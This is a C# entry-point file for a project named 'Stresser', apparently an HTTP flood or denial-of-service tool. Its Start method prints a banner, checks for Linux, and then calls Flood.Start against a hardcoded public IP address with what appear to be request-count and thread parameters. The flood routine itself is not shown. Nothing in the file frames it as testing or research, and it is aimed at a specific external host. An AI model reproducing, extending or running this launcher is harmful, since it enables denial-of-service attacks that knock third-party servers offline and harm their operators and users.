using System.Text;
using Stresser.Services.WebServerService;
using Stresser.Helpers.ConfigHelper;
using Stresser.Helpers.HLogger;
using Stresser.Services.LinuxService;
using Stresser.Helpers.Flood;

namespace Stresser
{
    public class Program
    {
        public static HLogger hLogger = new HLogger();
        public static string appWorkDir = AppDomain.CurrentDomain.BaseDirectory;

        public static void Main(string[] args)
        {
            Start();
        }

        public static void Start()
        {
            AsciiPrints.Random();
            Directory.SetCurrentDirectory(appWorkDir);
            Environment.CurrentDirectory = appWorkDir;
            if (ConfigHelper.GetSetting("os", "forcewinsupport") == "false")
            {
                if (!OperatingSystem.IsLinux())
                {
                    hLogger.Log(LogType.Error, "This app can only be executed on a linux device");
                }
            }
            Flood.Start("http://134.73.112.72/HIT", 15000,1500);
            //WebServerService wbs = new WebServerService();
            //Stop();
            //string port = ConfigHelper.GetSetting("webserver", "port");
            //string host = ConfigHelper.GetSetting("webserver", "host");
            //hLogger.Log(LogType.Info, "Please wait while we start the webserver at " + host + ":" + port);
            //wbs.Start(port, host);
        }

        public static void Stop()
        {
            Environment.Exit(0x0);
        }
    }
}